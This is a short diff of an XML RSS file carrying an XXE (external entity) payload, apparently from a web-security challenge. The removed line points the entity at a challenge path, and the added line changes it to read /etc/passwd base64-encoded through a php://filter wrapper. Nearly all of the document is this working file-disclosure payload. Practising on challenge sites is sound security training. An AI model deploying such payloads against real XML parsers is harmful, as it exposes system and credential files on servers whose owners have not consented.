@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE title [
 <!ELEMENT title ANY >
-<!ENTITY a SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29">]>
+<!ENTITY a SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
